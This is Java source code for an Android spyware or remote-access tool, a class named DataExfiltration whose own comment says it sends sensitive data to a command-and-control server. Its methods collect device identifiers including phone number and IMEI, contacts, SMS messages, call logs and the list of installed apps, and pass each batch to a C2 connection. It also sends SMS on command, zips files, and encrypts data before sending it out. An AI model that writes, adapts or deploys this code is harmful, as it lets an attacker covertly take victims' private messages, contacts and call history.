package com.tarjon.admin.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Utility class for data extraction and exfiltration operations.
 * Handles accessing and sending sensitive data to C2 server.
 */
public class DataExfiltration {

    private static final String TAG = "DataExfiltration";
    
    private Context context;
    private EncryptionManager encryptionManager;
    private C2Connection c2Connection;
    
    public DataExfiltration(Context context, EncryptionManager encryptionManager) {
        this.context = context;
        this.encryptionManager = encryptionManager;
        this.c2Connection = new C2Connection(context, encryptionManager);
    }
    
    /**
     * Collect and send basic device information
     */
    public void collectAndSendDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            
            // Device model and manufacturer
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("device", Build.DEVICE);
            
            // OS information
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("build_id", Build.ID);
            
            // Get phone info
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            // Only get these if we have proper permissions
            if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                deviceInfo.put("phone_number", telephonyManager.getLine1Number());
                
                // IMEI is deprecated in newer Android versions, but still try if available
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    String imei = telephonyManager.getDeviceId();
                    deviceInfo.put("imei", imei);
                }
                
                deviceInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
            }
            
            // Send to C2
            c2Connection.sendDeviceInfo(deviceInfo.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage());
        }
    }
    
    /**
     * Extract contacts from the device
     * @return JSON string of contacts or error message
     */
    public String extractContacts() {
        try {
            JSONArray contactsArray = new JSONArray();
            
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("id", id);
                    contact.put("name", name);
                    
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        JSONArray phones = new JSONArray();
                        
                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id},
                                null
                        );
                        
                        while (phoneCursor != null && phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(
                                    phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            String phoneType = phoneCursor.getString(
                                    phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            
                            JSONObject phoneObj = new JSONObject();
                            phoneObj.put("number", phoneNumber);
                            phoneObj.put("type", phoneType);
                            phones.put(phoneObj);
                        }
                        
                        if (phoneCursor != null) {
                            phoneCursor.close();
                        }
                        
                        contact.put("phones", phones);
                    }
                    
                    // Get emails
                    JSONArray emails = new JSONArray();
                    Cursor emailCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                    );
                    
                    while (emailCursor != null && emailCursor.moveToNext()) {
                        String email = emailCursor.getString(
                                emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        String emailType = emailCursor.getString(
                                emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        
                        JSONObject emailObj = new JSONObject();
                        emailObj.put("email", email);
                        emailObj.put("type", emailType);
                        emails.put(emailObj);
                    }
                    
                    if (emailCursor != null) {
                        emailCursor.close();
                    }
                    
                    contact.put("emails", emails);
                    contactsArray.put(contact);
                }
                
                cursor.close();
            }
            
            // Send to C2
            c2Connection.sendContacts(contactsArray.toString());
            
            return "Extracted " + contactsArray.length() + " contacts";
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting contacts: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Extract SMS messages from the device
     * @return JSON string of SMS messages or error message
     */
    public String extractSMS() {
        try {
            JSONArray smsArray = new JSONArray();
            
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    null,
                    null,
                    null,
                    Telephony.Sms.DATE + " DESC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long dateInMillis = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(dateInMillis));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "inbox" : "sent");
                    
                    smsArray.put(sms);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            // Send to C2
            c2Connection.sendSMS(smsArray.toString());
            
            return "Extracted " + smsArray.length() + " SMS messages";
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting SMS: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Extract call logs from the device
     * @return JSON string of call logs or error message
     */
    public String extractCallLogs() {
        try {
            JSONArray callLogsArray = new JSONArray();
            
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject callLog = new JSONObject();
                    
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    long dateInMillis = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(dateInMillis));
                    int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String callType;
                    switch (type) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            callType = "outgoing";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            callType = "incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callType = "missed";
                            break;
                        default:
                            callType = "unknown";
                    }
                    
                    callLog.put("number", number);
                    callLog.put("date", date);
                    callLog.put("duration", duration);
                    callLog.put("type", callType);
                    
                    callLogsArray.put(callLog);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            // Send to C2
            c2Connection.sendCallLogs(callLogsArray.toString());
            
            return "Extracted " + callLogsArray.length() + " call logs";
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting call logs: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Get list of installed applications
     * @return JSON string of installed apps or error message
     */
    public String listInstalledApps() {
        try {
            JSONArray appsArray = new JSONArray();
            
            PackageManager packageManager = context.getPackageManager();
            List<PackageInfo> packages = packageManager.getInstalledPackages(0);
            
            for (PackageInfo packageInfo : packages) {
                JSONObject app = new JSONObject();
                
                app.put("package_name", packageInfo.packageName);
                app.put("version_name", packageInfo.versionName);
                app.put("version_code", packageInfo.versionCode);
                
                ApplicationInfo appInfo = packageInfo.applicationInfo;
                app.put("app_name", appInfo.loadLabel(packageManager).toString());
                app.put("is_system_app", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                
                appsArray.put(app);
            }
            
            // Send to C2
            c2Connection.sendInstalledApps(appsArray.toString());
            
            return "Extracted info for " + appsArray.length() + " installed apps";
            
        } catch (Exception e) {
            Log.e(TAG, "Error listing installed apps: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Send an SMS message
     * @param number Target phone number
     * @param message Message content
     * @return Success message or error
     */
    public String sendSMS(String number, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            
            if (message.length() > 160) {
                // Split long messages
                ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(number, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(number, null, message, null, null);
            }
            
            return "SMS sent to " + number;
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Compress a file or directory into a ZIP archive
     * @param source Source file or directory
     * @param destination Destination ZIP file path
     * @return Success or error message
     */
    public String compressToZip(File source, File destination) {
        try {
            FileOutputStream fos = new FileOutputStream(destination);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            if (source.isDirectory()) {
                // Compress directory contents
                addDirToZip(source, source.getName(), zos);
            } else {
                // Compress single file
                addFileToZip(source, "", zos);
            }
            
            zos.close();
            fos.close();
            
            return "Successfully compressed to " + destination.getPath();
            
        } catch (IOException e) {
            Log.e(TAG, "Error compressing to ZIP: " + e.getMessage());
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Add a directory to a ZIP file
     */
    private void addDirToZip(File dir, String basePath, ZipOutputStream zos) throws IOException {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                addDirToZip(file, basePath + "/" + file.getName(), zos);
            } else {
                addFileToZip(file, basePath, zos);
            }
        }
    }
    
    /**
     * Add a file to a ZIP file
     */
    private void addFileToZip(File file, String basePath, ZipOutputStream zos) throws IOException {
        String entryPath = basePath.isEmpty() ? file.getName() : basePath + "/" + file.getName();
        ZipEntry zipEntry = new ZipEntry(entryPath);
        zos.putNextEntry(zipEntry);
        
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[1024];
        int length;
        while ((length = fis.read(buffer)) > 0) {
            zos.write(buffer, 0, length);
        }
        
        fis.close();
        zos.closeEntry();
    }
    
    /**
     * Encrypt and compress data before sending to C2
     * @param data The data to process
     * @return Encrypted and compressed data
     */
    public byte[] encryptAndCompressData(String data) throws IOException {
        try {
            // Compress
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);
            
            ZipEntry entry = new ZipEntry("data.json");
            zos.putNextEntry(entry);
            zos.write(data.getBytes());
            zos.closeEntry();
            zos.close();
            
            byte[] compressed = baos.toByteArray();
            
            // Encrypt
            return encryptionManager.encrypt(compressed);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing data: " + e.getMessage());
            throw new IOException("Data processing failed: " + e.getMessage());
        }
    }
}
